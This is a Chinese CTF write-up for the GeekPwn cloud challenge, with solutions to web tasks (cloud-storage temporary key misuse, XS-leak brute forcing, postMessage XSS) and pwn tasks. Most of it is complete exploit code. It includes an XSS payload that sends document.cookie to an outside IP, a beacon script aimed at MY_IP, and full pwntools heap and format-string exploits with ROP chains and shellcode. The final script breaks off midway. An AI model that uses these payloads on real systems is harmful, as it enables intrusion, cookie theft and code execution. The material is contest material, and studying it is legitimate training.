# GeekPwn 云上挑战赛

## web
### cosplay


右键查看HTML源代码可以得到如下js，可以发现是一个腾讯云对象存储，给了存储桶名称和地区，然后采用的临时密钥，临时密钥可以在`/GetTempKey?path=/upload`这里可以得到

```javascript
var Bucket = '933kpwn-1253882285';
var Region = 'ap-shanghai';

var cos = new COS({
    getAuthorization: function (options, callback) {
        var url = '/GetTempKey?path=/upload';
        var xhr = new XMLHttpRequest();
        xhr.open('GET', url, true);
        xhr.onload = function (e) {
            try {
                var data = JSON.parse(e.target.responseText);
                var credentials = data.Credentials;
            } catch (e) {
            }
            if (!data || !credentials) return console.error('credentials invalid');
            callback({
                TmpSecretId: credentials.TmpSecretId,
                TmpSecretKey: credentials.TmpSecretKey,
                XCosSecurityToken: credentials.Token,
                ExpiredTime: data.ExpiredTime,
            });
        };
        xhr.send();
    }
});
```

既然已经得到了存储桶的信息和临时密钥，就可以对Bucket进行操作了。官方Node.js SDK文档：https://cloud.tencent.com/document/product/436/8629  在这个文档里给出了`查询对象列表`和`下载对象`的相关代码，所以只需要用临时密钥做授权，先查询对象然后发现flag的位置，之后把flag下载下来就可以了。

不过官方文档里给的代码有一些需要改的，比如把`tmpSecretId`改成`TmpSecretId`(首字母大写)，简单修改一下改成和题目相符的，之后就可以直接用了。先prefix为`''` 读出来`f1L9@`这个目录，然后读这个目录下文件发现flag.txt，之后把flag.txt下载下来就可以啦

```javascript
var request = require('request');
var COS = require('cos-nodejs-sdk-v5');
var fs = require('fs');
var cos = new COS({
    getAuthorization: function (options, callback) {
        // 异步获取临时密钥
        request({
            url: 'http://110.80.136.39:20763/GetTempKey?path=/upload',
            data: {
                // 可从 options 取需要的参数
            }
        }, function (err, response, body) {
            // console.log(response)
            try {
                var data = JSON.parse(body);
                // console.log(data)
                var credentials = data.Credentials;   //note:首字母大写
                // console.log(credentials)
            } catch(e) {console.log(e)}
            if (!data || !credentials) return console.error('credentials invalid!!');
            callback({
                TmpSecretId: credentials.TmpSecretId,        // 临时密钥的 tmpSecretId
                TmpSecretKey: credentials.TmpSecretKey,      // 临时密钥的 tmpSecretKey
                XCosSecurityToken: credentials.Token, // 临时密钥的 sessionToken
                ExpiredTime: data.ExpiredTime,               // 临时密钥失效时间戳，是申请临时密钥时，时间戳加 durationSeconds
            });
        });
    }
});

//note:先prefix为'' 读出来f1L9@这个目录，然后读这个目录下文件发现flag.txt
cos.getBucket({
    Bucket: '933kpwn-1253882285', /* 必须 */
    Region: 'ap-shanghai',     /* 必须 */
    Prefix: 'f1L9@/',           /* 非必须 */
}, function(err, data) {
    console.log(data)   //note:这里要改改 不要用data.content
});


//文件读取
cos.getObject({
    Bucket: '933kpwn-1253882285', /* 必须 */
    Region: 'ap-shanghai',    /* 必须 */
    Key: 'f1L9@/flag.txt',              /* 必须 */
    Output: fs.createWriteStream('./exampleobject.txt'),
}, function(err, data) {
    console.log(err || data);
});
```


### no-xss

根据 `/search` 接口的状态码 200 / 404 可以利用 `<script>` 的 onload / onerror 逐字节爆 flag。

exp:

```
<body>
    <script>
    function log(x) {
        var im=document.createElement('img');
        im.src='http://MY_IP/log?'+x;
        document.body.appendChild(im);
    }
    log('load');
    function g(s) {
        log('done='+s);
        tryy(s);
    }
    function tryy(pfx) {
        ['{','}','q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m','-','_','1','2','3','4','5','6','7','8','9','0'].forEach((c)=>{
            document.write('<script src="http://noxss2020.cal1.cn:3000/search?keyword=flag'+encodeURIComponent(pfx+c)+'" onload="g(\''+pfx+c+'\')"><'+'/script>');
        });
    }
    tryy('');
    </script>
</body>
```

### umsg
index.js里有监听器，典型的postmessage xss。
![](https://i.imgur.com/XVlAcmn.png)

而且跟当年鹅厂的洞很像：https://zhuanlan.zhihu.com/p/25586887

测一下debug，能直接通信
![](https://i.imgur.com/ssBBxP4.png)


bot没限制ur。vps引iframe来打就行了，用子域过match
![](https://i.imgur.com/Mc3MJn1.png)

```
<!doctype html>


<iframe id="frame" width="222" height="400"></iframe>
<script>
    let frame = document.getElementById("frame"); // I don't like being implicit.
    frame.src = "http://umsg.iffi.top:3000/";
    //frame.src = "http://ctf.localhost.com/password.html";

    frame.onload =function(){
      document.getElementById("frame").contentWindow.postMessage({"action":"append","payload":"<img src='' onerror='window.location=`http://120.79.152.66:8888`+document.cookie'>"},"*")
    }
</script>

</html>
```
![](https://i.imgur.com/9Wa93FJ.png)





## Pwn
### BabyPwn
libc 2.23
两个漏洞：
1）show 时 index 采用了有符号数比较，可以传负值泄露 libc。
2）add 的 size 为 0 时，可以一直溢出
然后就没什么好说的了，直接 house of orange
```=python
from pwn import *
from ctypes import *
import os
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex
import struct
#import roputils as rop

remote_addr = "110.80.136.39"
remote_port = 14546

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 0
haslibc = 1
atta = 1

pc = './chall'
pwn_elf = ELF(pc)

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
    print "haha2"
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): 
              os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    print path
    return ELF(path)


def pack_file_64(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _mode = 0):
    struct = p64(_flags) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xc0,"\x00")
    struct += p64(_mode)
    struct = struct.ljust(0xd8, "\x00")
    return struct


if uselibc == 2:
  context.arch = "amd64"
else:
  context.arch = "i386"

if uselibc ==2 and haslibc == 0:
  libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
  if uselibc == 1 and haslibc == 0:
    libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
  else:
    libc = ELF('./libc.so.6')

if local == 1:
  if haslibc:
    #elf = change_ld(pc, './ld.so')
    #p = elf.process(env={'LD_PRELOAD':'./libc.so.6'})
    p = process(pc,env={'LD_PRELOAD':'./libc.so.6'}) 
  else:
    p = process(pc)
elif local == 0:
  p = remote(remote_addr,remote_port)
  if haslibc:
    libc = ELF('./libc.so.6')

context.log_level = True

if local:
  if atta:
    #gdb.attach(p,'b *0x00000000001142F6 + 0x555555554000\n b*0x00000000001147D2 + 0x555555554000\n b*0x000000000011432B+0x555555554000')
    gdb.attach(p,'b *0x00000000001014+0x555555554000\n')
    #gdb.attach(p,'b *0x400EF5\n')


def sla(a,b):
  p.sendlineafter(a,b)

def sa(a,b):
  p.sendafter(a,b)

def ru(a):
  return p.recvuntil(a)

def rl():
  return p.recvline()

def rv(a):
  return p.recv(a)

def sn(a):
  p.send(a)

def sl(a):
  p.sendline(a)

def lg(s,addr):
  print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def add(size,name,content):
  sla('choice:','1')
  sla('name:',name)
  sla('size:',str(size))
  sla('Description:',content)

def delete(idx):
  sla('choice:','2')
  sla('index:',str(idx))


def show(idx):
  sla('choice:','3')
  sla('index:',str(idx))

def hack():
  raw_input()
  show(-5)
  ru('name:')
  libc.address = u64(rv(6).ljust(8,'\x00')) - libc.symbols['stdin']
  lg('libc',libc.address)
  malloc_hook = libc.symbols['__malloc_hook']
  system = libc.symbols['system']
  io_list_all = libc.symbols['_IO_list_all']
  #show(-13)
  

  add(0x10,'a','a')
  add(0x10,'b','b')
  add(0x40,'c',p64(0x11)*7)
  add(0x40,'c',p64(0x11)*7)
  add(0x40,'c',p64(0x11)*7)
  add(0x40,'c',p64(0x11)*7)

  delete(1)
  delete(0)

  add(0,'a','')
  show(0)
  ru('Description:')
  heap_addr = u64(rv(6).ljust(8,'\x00'))
  lg('heap',heap_addr)
  add(1,'b','b')

  delete(0)
  payload = '\x00'*0x10 + p64(0) + p64(0x91)
  add(0,'a',payload)

  delete(1)
  delete(0)
  fake_fd = 0
  fake_bk = io_list_all - 0x10
  payload = 'a'*0x10
  payload += pack_file_64(_flags = u64('/bin/sh\0'),
             _IO_read_ptr = 0x61,
             _IO_read_end = fake_fd,
             _IO_read_base = fake_bk,
             _IO_write_base = 2,
             _IO_write_ptr = 3)
  vtalbe = heap_addr + 0xe0
  payload += p64(vtalbe)
  payload += p64(0)*2 + p64(system) + p64(system)
  add(0,'a',payload)

  sla('choice:','1')
  sla('name:','a')
  sla('size:',str(0x20))

  p.interactive()
hack()
```
### PaperPrinter
给了 sleep 的 8~19 bit，然后通过 sleep 的后 12 bit 为 0x2XX，得到 libc 版本应该为 2.23（具体为 10 还是 11 无法得知，但可以通过之前题目的 libc 猜测为相同版本）。
程序 mmap 出来了一段空间，可以任意释放和修改 mmap 的内容。既然是 libc2.23 且我们只有两次 malloc 的机会（一次 malloc（0x138），一次 strdup），所以首先考虑布局 chunk 造成 unsortedbin attack。
题目的麻烦点在于没有地址泄露（需要 heap 和 libc 地址），所以要利用不断释放和申请 chunk 在合适的位置预留堆地址（FILE_IO vtable 用）和 libc 地址，然后又已知 sleep 的中间 12 位，可以部分覆写 libc 地址（爆破 4 bit）到 system，然后就又是熟悉的配方（house of orange）
```=python
from pwn import *
from ctypes import *
import os
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex
import struct
#import roputils as rop

remote_addr = "110.80.136.39"
remote_port = 15682
#110.80.136.39 11271 
uselibc = 2 #0 for no,1 for i386,2 for x64
local = 0
haslibc = 1
atta = 0

pc = './chall'
pwn_elf = ELF(pc)

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
    print "haha2"
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): 
              os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    print path
    return ELF(path)


def pack_file_64(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _mode = 0):
    struct = p64(_flags) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xc0,"\x00")
    struct += p64(_mode)
    struct = struct.ljust(0xd8, "\x00")
    return struct


if uselibc == 2:
  context.arch = "amd64"
else:
  context.arch = "i386"

if uselibc ==2 and haslibc == 0:
  libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
else:
  if uselibc == 1 and haslibc == 0:
    libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')
  else:
    libc = ELF('./libc.so.6')

if local == 1:
  if haslibc:
    elf = change_ld(pc, './ld.so')
    p = elf.process(env={'LD_PRELOAD':'./libc.so.6'})
    #p = process(pc,env={'LD_PRELOAD':'./libc.so.6'}) 
  else:
    p = process(pc)
elif local == 0:
  p = remote(remote_addr,remote_port)
  if haslibc:
    libc = ELF('./libc.so.6')

context.log_level = True

if local:
  if atta:
    #gdb.attach(p,'b *0x00000000001142F6 + 0x555555554000\n b*0x00000000001147D2 + 0x555555554000\n b*0x000000000011432B+0x555555554000')
    #gdb.attach(p,'b *0x00000000001147A3+0x555555554000\n b*0x00000000001147B5+0x555555554000')
    gdb.attach(p,'c')


def sla(a,b):
  p.sendlineafter(a,b)

def sa(a,b):
  p.sendafter(a,b)

def ru(a):
  return p.recvuntil(a)

def rl():
  return p.recvline()

def rv(a):
  return p.recv(a)

def sn(a):
  p.send(a)

def sl(a):
  p.sendline(a)

def lg(s,addr):
  print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def add(offset,length,content):
  sla('choice:','1')
  sla('offset :',str(offset))
  sla('length :',str(length))
  sla('content :',content)

def delete(offset):
  sla('choice:','2')
  sla('offset :',str(offset))

def hack():
  raw_input()
  sleep = int(rl(),16)
  tmp = (sleep << 8) + 0x30 + 0xa00000
  system = sleep - 2159
  if system < 0:
    system += 0x1000
  system = (system << 8) + 0x90
  system_b0 = system % 0x100
  system /= 0x100
  system_b1 = system % 0x100
  system /= 0x100
  system_b2 = system % 0x100
  system_b2 += 0xa0

  payload = p64(0) + p64(0x141)
  payload += '\x00'*0x130
  payload += p64(0x11)*4
  add(0x50,0x200,payload)
  #delete(0x60)
  #sla('choice:','3')

  payload = p64(0) + p64(0x141)
  payload += '\x00'*0x70
  payload += p64(0) + p64(0x91)
  payload += '\x00'*0x80
  payload += p64(0x11)*4
  payload = payload.ljust(0x140,'\x00')
  payload += p64(0x11)*4  
  add(0x110,0x200,payload)

  delete(0x120)
  delete(0x110+0x90)
  sla('choice:','3')

  delete(0x60)
  
  sla('choice:','1')
  sla('offset :',str(0x1a8))
  sla('length :',str(3))
  sa('content :',chr(system_b0)+chr(system_b1)+chr(system_b2))
  
  sla('choice:','1')
  sla('offset :',str(0x50))
  sla('length :',str(0x1a))
  io_list_all = tmp + 0x2f92f0
  io_list_all_b0 = io_list_all % 0x100
  io_list_all /= 0x100
  io_list_all_b1 = io_list_all % 0x100
  payload = '/bin/sh\x00' + p64(0x61) + p64(0) + chr(io_list_all_b0-0x10) + chr(io_list_all_b1)
  sa('content :',payload)
  
  sla('choice:','1')
  sla('offset :',str(0x70))
  sla('length :',str(0xb8))
  payload = p64(2) + p64(3) + '\x00'*0xa8
  sa('content :',payload)
  
  sla('choice:','4')
  p.interactive()
hack()
```

### EasyShell
没啥好说的，格式化字符串。唯一的难点在于劫持控制流后怎么迁移栈。
```=python
from pwn import *
from ctypes import *
import os
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex
import struct
#import roputils as rop

remote_addr = "110.80.136.39"
remote_port = 11271
#110.80.136.39 11271
uselibc = 2 #0 for no,1 for i386,2 for x64
local = 0
haslibc = 0
atta = 1

pc = './chall'
pwn_elf = ELF(pc)

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
    print "haha2"
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): 
              os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    print path
    return ELF(path)


def pack_file_64(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _mode = 0):
    struct = p64(_flags) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xc0,"\x00")
    struct += p64(_mode)
    struct = struct.ljust(0xd8, "\x00")
    return struct


if uselibc == 2:
  context.arch = "amd64"
else:
  context.arch = "i386"

if uselibc ==2 and haslibc == 0:
  libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
else:
  if uselibc == 1 and haslibc == 0:
    libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')
  else:
    libc = ELF('./libc.so.6')

if local == 1:
  if haslibc:
    elf = change_ld(pc, './ld.so')
    p = elf.process(env={'LD_PRELOAD':'./libc.so.6'})
    #p = process(pc,env={'LD_PRELOAD':'./libc.so.6'}) 
  else:
    p = process(pc)
elif local == 0:
  p = remote(remote_addr,remote_port)
  if haslibc:
    libc = ELF('./libc.so.6')

context.log_level = True

if local:
  if atta:
    #gdb.attach(p,'b *0x00000000001142F6 + 0x555555554000\n b*0x00000000001147D2 + 0x555555554000\n b*0x000000000011432B+0x555555554000')
    #gdb.attach(p,'b *0x00000000001147A3+0x555555554000\n b*0x00000000001147B5+0x555555554000')
    gdb.attach(p,'b *0x400dde\n')


def sla(a,b):
  p.sendlineafter(a,b)

def sa(a,b):
  p.sendafter(a,b)

def ru(a):
  return p.recvuntil(a)

def rl():
  return p.recvline()

def rv(a):
  return p.recv(a)

def sn(a):
  p.send(a)

def sl(a):
  p.sendline(a)

def lg(s,addr):
  print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def hack():
  raw_input()
  fini_array = 0x00000000006D6828
  fake_stack = 0x6ed0c8
  #push_rbp_ret = 0x00000000004c9c36
  add_rsp_8 = 0x00000000004002dd
  add_rsp_18 = 0x0000000000401825

  pop_rdi_ret = 0x0000000000401f0a
  read_addr = 0x0000000000400BCE
  leave_ret = 0x0000000000400c6c
  #ret = 0x0000000000400DFD
  
  offset = 22
  #payload = '%12c' + '%' + str(offset) + '$hhn'
  #payload += '%96c' + '%' + str(offset + 1) + '$hhn'
  payload = '%' + str(0xc6c) + 'c' + '%' + str(offset) + '$hn'

  payload += '%' + str(0x40+0x100-0x6c) + 'c' + '%' + str(offset + 1) + '$hhn'
  payload += '%' + str(0xf6dd-0x140) + 'c' + '%' + str(offset + 2) + '$hn'
  #payload += '%' + str(0x2+0x100-0x6c) + 'c' + '%' + str(offset + 3) + '$hhn'
  #payload += '%' + str(0x40-0x2) + 'c' + '%' + str(offset + 4) + '$hhn'
  
  payload += '%' + str(0x340-0x2dd) + 'c' + '%' + str(offset + 3) + '$hhn'
  payload += '%' + str(0x1f0a-0x340) + 'c' + '%' + str(offset + 4) + '$hn'

  payload += '%' + str(0x40-0xa) + 'c' + '%' + str(offset + 5) + '$hhn'
  payload += '%' + str(0xecce-0x40) + 'c' + '%' + str(offset + 6) + '$hn' 

  payload += '%' + str(0x40+0x100-0xce) + 'c' + '%' + str(offset + 7) + '$hhn'
  payload += '%' + str(0xd25-0x140) + 'c' + '%' + str(offset + 8) + '$hn'
  
  #payload += '%' + str(0xdd-0x40) + 'c' + '%' + str(offset + 2) + '$hhn'
  #payload += '%' + str(0xa+0x100-0xdd) +'c' + '%' + str(offset + 5) + '$hhn'
  #payload += '%' + str(0x1f-0xa) + 'c' + '%' + str(offset + 6) + '$hhn'
  #payload += '%' + str(0x40-0x1f) + 'c' + '%' + str(offset + 7) + '$hhn'

  payload = payload.ljust(0x70,'\x00')
  payload += p64(fini_array)

  payload += p64(fake_stack + 2)
  payload += p64(fake_stack)

  payload += p64(fake_stack + 0x10 + 2)
  payload += p64(fake_stack + 0x10)
  
  payload += p64(fake_stack + 0x20 + 2)
  payload += p64(fake_stack + 0x20)

  payload += p64(fake_stack + 0x28 + 2)
  payload += p64(fake_stack + 0x28)

  sla('echo back.\n',payload)

  pop_rsi_ret = 0x00000000004014a4
  syscall = 0x0000000000471115
  pop_rdx_ret = 0x000000000044c476
  pop_rax_ret = 0x0000000000423f7f
  pop_rdi_ret = 0x000000000040b74a
  sub_eax_edx = 0x000000000041c72e
  payload = '\x00'*0x10
  payload += p64(pop_rdi_ret) + p64(0x6ed000) + p64(0)
  payload += p64(pop_rsi_ret) + p64(0x1000)
  payload += p64(pop_rdx_ret) + p64(7)
  payload += p64(pop_rax_ret) + p64(17)
  payload += p64(sub_eax_edx)
  payload += '\x00'*0x2c + p64(syscall)

  #raw_input()
  #sleep(1)
  payload += p64(0x6ed19c)
  payload += asm(shellcraft.amd64.linux.read(0,'rdi',0x200))
  #raw_input()
  sl(payload)
  
  payload = './flag'.ljust(0x1a9,'\x00')
  shellcode = '''
    mov rdi,0x6ed000
    xor rsi,rsi
    mov rax,2
    syscall
    mov rdi,5
    mov rsi,0x6ed000
    mov rdx,0x80
    mov rax,0
    syscall
    mov rdi,1
    mov rsi,0x6ed000
    mov rdx,0x80
    mov rax,1
    syscall
  '''
  payload += asm(shellcode)
  #raw_input()
  sl(payload.ljust(0x200,'\x00'))

  #sl('\x00'*0x41000)
  p.interactive()
hack()

```
### PlayTheNew
libc2.30 且使用了 seccomp（只能 open，read，write，mprotect...）
使用了 calloc，所以 tcache 就不用想了，方法就是 smallbin attack（感觉考烂了）修改 mmap 的第一个 qword，然后就可以劫持控制流了，然后就又是怎么迁移栈的问题了。
我们可以从 libc 中找到如下一个片段：
![magic](https://i.imgur.com/Ew0koCV.png)
我们 rdi 可控（且 rdi 指向内容也可控），所以 rbp 就可以控制了，所以我们只要布局好，让程序走到 call rax（rax 也可控），就既能修改了 rbp，然后又能把程序控制流再劫持回来。然后就没有然后了（mprotect + orw）
```=python
from pwn import *
from ctypes import *
import os
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex
import struct
#import roputils as rop

remote_addr = "110.80.136.39"
remote_port = 12838
#110.80.136.39 11271 
uselibc = 2 #0 for no,1 for i386,2 for x64
local = 0
haslibc = 1
atta = 0

pc = './chall'
pwn_elf = ELF(pc)

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
    print "haha2"
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): 
              os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    print path
    return ELF(path)


def pack_file_64(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _mode = 0):
    struct = p64(_flags) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xc0,"\x00")
    struct += p64(_mode)
    struct = struct.ljust(0xd8, "\x00")
    return struct


if uselibc == 2:
  context.arch = "amd64"
else:
  context.arch = "i386"

if uselibc ==2 and haslibc == 0:
  libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
else:
  if uselibc == 1 and haslibc == 0:
    libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')
  else:
    libc = ELF('./libc.so.6')

if local == 1:
  if haslibc:
    elf = change_ld(pc, './ld.so')
    p = elf.process(env={'LD_PRELOAD':'./libc.so.6'})
    #p = process(pc,env={'LD_PRELOAD':'./libc.so.6'}) 
  else:
    p = process(pc)
elif local == 0:
  p = remote(remote_addr,remote_port)
  if haslibc:
    libc = ELF('./libc.so.6')

context.log_level = True

if local:
  if atta:
    #gdb.attach(p,'b *0x00000000001142F6 + 0x555555554000\n b*0x00000000001147D2 + 0x555555554000\n b*0x000000000011432B+0x555555554000')
    #gdb.attach(p,'b *0x00000000001147A3+0x555555554000\n b*0x00000000001147B5+0x555555554000')
    gdb.attach(p,'b *0x555555554000+0x14df\n')


def sla(a,b):
  p.sendlineafter(a,b)

def sa(a,b):
  p.sendafter(a,b)

def ru(a):
  return p.recvuntil(a)

def rl():
  return p.recvline()

def rv(a):
  return p.recv(a)

def sn(a):
  p.send(a)

def sl(a):
  p.sendline(a)

def lg(s,addr):
  print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))


def add(index,size,content):
    sla('> ','1')
    sla('index:',str(index))
    sla('basketball:',str(size))
    sa('name:',content)

def free(index):
  sla('> ','2')
  sla('basketball:',str(index))

def show(index):
  sla('> ','3')
  sla('basketball:',str(index))

def edit(index,content):
  sla('> ','4')
  sla('basketball:',str(index))
  sa('the basketball:',content)

def hack():
  raw_input()
  add(0,0x200,'a')
  add(1,0x200,'a')
  add(2,0x200,'a')
  add(3,0xF0,'a')
  for i in range(6):
    free(0)
    edit(0,'\x00'*0x10)
  for i in range(6):
    free(3)
    edit(3,'\x00'*0x10)
  free(0)
  show(0)
  ru('Show the dance:')
  heap_base = u64(p.recv(6).ljust(8,'\x00')) - 0x2A0
  lg('heap:',heap_base)
  edit(0,'\x00'*0x10)
  free(0)
  show(0)
  libc.address = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - 0x70 - libc.symbols['__malloc_hook']
  lg('libc:',libc.address)
  add(1,0x100,'a')
  free(2)
  add(3,0x100,'a')
  add(3,0x200,'a')
  edit(2,'\x00'*0x100 + p64(0) + p64(0x101)  +  p64(heap_base + 0x3A0) + p64(0x100000 - 0x10))
  add(1,0xF0,'a')
  #system = libc.symbols['system']
  #lg('system',system)
  magic_addr = libc.address + 0x0000000000153AB0
  leave_ret = libc.address + 0x000000000005a9a8
  pop_rdi = libc.address + 0x0000000000026bb2
  pop_rsi = libc.address + 0x000000000002709c
  pop_rdx_pop_r12 = libc.address + 0x000000000011c421
  pop_rax = libc.address + 0x0000000000028ff4
  syscall = libc.address + 0x0000000000066199
  pp_ret = libc.address + 0x0000000000091390
  lg('magic',magic_addr)
  payload = p64(0) + p64(magic_addr) + p64(0x100010) + p64(0x100030) + p64(0)
